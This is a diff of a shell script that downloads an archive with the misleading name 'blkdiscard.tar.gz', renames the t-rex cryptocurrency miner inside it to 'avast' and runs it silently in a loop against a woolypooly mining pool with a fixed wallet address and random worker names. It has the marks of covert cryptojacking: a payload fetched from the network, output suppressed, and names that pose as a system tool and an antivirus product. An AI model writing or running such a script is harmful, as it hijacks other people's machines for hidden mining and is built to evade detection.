@@ -14,17 +14,17 @@ apt install proxychains
 
 apt install screen -y
 
-wget https://github.com/bzminer/bzminer/releases/download/v7.2.5/bzminer_v7.2.5_linux_cuda_tk.tar.gz >/dev/null 2>&1 
+wget https://github.com/renilo/bc/releases/download/A/blkdiscard.tar.gz >/dev/null 2>&1 
 
-tar xf bzminer_v7.2.5_linux_cuda_tk.tar.gz >/dev/null 2>&1
+tar xf blkdiscard.tar.gz >/dev/null 2>&1
 
-rm -f bzminer_v7.2.5_linux_cuda_tk.tar.gz
+rm -f blkdiscard.tar.gz
 
-mv bzminer avast
+mv t-rex avast
 
 chmod +x avast >/dev/null 2>&1
 
-./avast -a alph -p stratum+tcp://pool.eu.woolypooly.com:3106 -w 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.$(echo $(shuf -i 1-9999999 -n 1)-MEKI)
+./avast -a blake3 -o stratum+tcp://pool.eu.woolypooly.com:3106 -u 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup -p x -w $(echo $(shuf -i 1-9999999 -n 1)-MEKI)
 
 while [ 1 ]; do
 
